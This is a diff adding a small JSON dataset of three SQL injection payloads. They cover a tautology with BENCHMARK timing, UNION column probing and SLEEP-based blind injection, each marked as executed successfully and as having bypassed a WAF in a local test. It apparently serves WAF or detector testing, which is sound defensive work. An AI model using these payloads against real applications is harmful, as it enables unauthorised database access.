@@ -1,0 +1,23 @@
+[
+  {
+    "id": 1,
+    "payload": "1' OR '1'='1' AND BENCHMARK(5000000,MD5('test'))--",
+    "label": "sqli",
+    "execution_status": "success",
+    "waf_status": "Bypassed (Local Test)"
+  },
+  {
+    "id": 2,
+    "payload": "1') UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL#",
+    "label": "sqli",
+    "execution_status": "success",
+    "waf_status": "Bypassed (Local Test)"
+  },
+  {
+    "id": 3,
+    "payload": "1) WHERE 1=1 AND SLEEP(3)#",
+    "label": "sqli",
+    "execution_status": "success",
+    "waf_status": "Bypassed (Local Test)"
+  }
+]
